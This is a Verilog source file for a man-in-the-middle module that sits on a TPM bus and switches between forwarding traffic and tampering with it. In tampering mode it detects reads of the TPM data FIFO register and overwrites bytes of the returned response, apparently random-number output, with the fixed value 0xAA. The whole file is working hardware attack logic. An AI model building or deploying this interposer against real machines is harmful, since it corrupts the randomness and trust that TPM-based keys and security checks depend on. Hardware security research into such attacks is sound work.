/**
 * Main MITM logic module:
 * - utilizes the Bus interface module to intercept and modify communication
 * - an additional mode selecting input is used to switch dynamically between different MITM modes
**/

module MitmLogic #(

	// parameters
	parameter NUM_DATA_BITS = 8,
	parameter NUM_MITM_MODES = 2
) (

	// system inputs
	input wire sys_clk,
	input wire rst,
	
	// i/o inputs
	input wire [NUM_MITM_MODES-1:0] mode_select,
	
	// bus control outputs
	output reg fake_if0_select = 1'b0,
	output reg fake_if1_select = 1'b0,
	output reg fake_if0_send_start = 1'b0,
	output reg fake_if1_send_start = 1'b0,
	output reg fake_if0_keep_alive = 1'b0,
	output reg fake_if1_keep_alive = 1'b0,
	
	// bus status inputs
	input wire if0_recv_new_data,
	input wire if1_recv_new_data,
	input wire fake_if0_send_ready,
	input wire fake_if1_send_ready,
	input wire fake_if0_send_done,
	input wire fake_if1_send_done,
	
	// data
	output reg [NUM_DATA_BITS-1:0] fake_if0_send_data = 0,
	output reg [NUM_DATA_BITS-1:0] fake_if1_send_data = 0,
	input wire [NUM_DATA_BITS-1:0] real_if0_recv_data,
	input wire [NUM_DATA_BITS-1:0] real_if1_recv_data
);

	// mode definitions
	localparam MODE_FORWARD = 2'b01;
	localparam MODE_SUB_CONST = 2'b10;
	
	reg [NUM_MITM_MODES-1:0] mode = MODE_FORWARD;
	
	// MITM logic states
	localparam STATE_WAIT_TPM_FIFO_READ = 0;
	localparam STATE_MITM = 1;
	localparam STATE_FAKE_SEND_START = 2;
	localparam STATE_FAKE_SEND_WAIT = 3;
	localparam STATE_RESET = 4;
	
	// internal registers and signals
	reg [2:0] state = STATE_RESET;
	
	reg [31:0] tpm_rw_reg;
	reg [2:0] tpm_rw_reg_parse_ctr = 3'd0;
	reg [7:0] tpm_rw_reg_size = 8'd0;
	reg tpm_new_rw_reg_val = 1'b0;
	
	reg [15:0] tpm_resp_ctr = 16'd0;
	reg [15:0] tpm_rand_size = 16'd0;
	
	always @ (posedge sys_clk)
	begin
		// reset internal state
		if (rst == 1'b1) begin
			mode <= MODE_FORWARD;
		end
		
		else if (tpm_resp_ctr == 16'd0) begin
			mode <= mode_select;
		end
	end
	
	always @ (posedge sys_clk)
	begin
		// reset internal state
		if (rst == 1'b1) begin
			tpm_rw_reg_parse_ctr <= 3'd0;
			tpm_rw_reg_size <= 8'd0;
			tpm_new_rw_reg_val <= 1'b0;
		end
		
		else begin
			if (if0_recv_new_data == 1'b1) begin
				if (tpm_rw_reg_size > 8'd0) begin
					tpm_rw_reg_size <= tpm_rw_reg_size - 1;
				end
				else begin
					tpm_rw_reg <= {tpm_rw_reg[23:0], real_if0_recv_data};
					tpm_rw_reg_parse_ctr <= tpm_rw_reg_parse_ctr + 1;
				end
			end
			
			if (tpm_rw_reg_parse_ctr == 3'd4) begin
				tpm_rw_reg_parse_ctr <= 3'd0;
				tpm_rw_reg_size <= {1'b0, tpm_rw_reg[30:24]} + 1;
				tpm_new_rw_reg_val <= 1'b1;
			end
			else begin
				tpm_new_rw_reg_val <= 1'b0;
			end
		end
	end
	
	always @ (posedge sys_clk)
	begin
		// reset internal state
		if (rst == 1'b1) begin
			state <= STATE_RESET;
		end
		
		else if (mode != MODE_FORWARD) begin
			case (state)
				
				STATE_WAIT_TPM_FIFO_READ: begin
					if (tpm_new_rw_reg_val == 1'b1) begin
						if (tpm_rw_reg[31] == 1'b1 && tpm_rw_reg[23:0] == 24'hd40024) begin
							state <= STATE_MITM;
						end
					end
				end
				
				STATE_MITM: begin
					if (tpm_rw_reg_size > 8'd0) begin
						if (tpm_resp_ctr < 16'd10) begin
							if (if1_recv_new_data == 1'b1) begin
								tpm_resp_ctr <= tpm_resp_ctr + 1;
							end
						end
						else if (tpm_resp_ctr < 16'd12) begin
							if (if1_recv_new_data == 1'b1) begin
								tpm_rand_size <= {tpm_rand_size[7:0], real_if1_recv_data};
								tpm_resp_ctr <= tpm_resp_ctr + 1;
							end
						end
						else if (tpm_resp_ctr < 16'd12 + tpm_rand_size) begin
							if (fake_if0_send_ready == 1'b1) begin
								fake_if0_send_data <= 8'haa;
								fake_if0_select <= 1'b1;
								fake_if0_send_start <= 1'b1;
								state <= STATE_FAKE_SEND_START;
							end
						end
					end

					else begin
						if (tpm_resp_ctr == 16'd12 + tpm_rand_size) begin
							fake_if0_select <= 1'b0;
							tpm_resp_ctr <= 4'd0;
						end
						state <= STATE_WAIT_TPM_FIFO_READ;
					end
				end
				
				STATE_FAKE_SEND_START: begin
					fake_if0_send_start <= 1'b0;
					state <= STATE_FAKE_SEND_WAIT;
				end
				
				STATE_FAKE_SEND_WAIT: begin
					if (fake_if0_send_done == 1'b1) begin
						tpm_resp_ctr <= tpm_resp_ctr + 1;
						state <= STATE_MITM;
					end
				end

				STATE_RESET: begin
					fake_if0_select <= 1'b0;
					fake_if0_send_start <= 1'b0;
					fake_if0_keep_alive <= 1'b0;
					fake_if0_send_data <= 0;
					
					tpm_resp_ctr <= 16'd0;
					tpm_rand_size <= 16'd0;
					
					state <= STATE_WAIT_TPM_FIFO_READ;
				end
				
				// this should never occur
				default: begin
					state <= STATE_RESET;
				end
				
			endcase
		end
	end

endmodule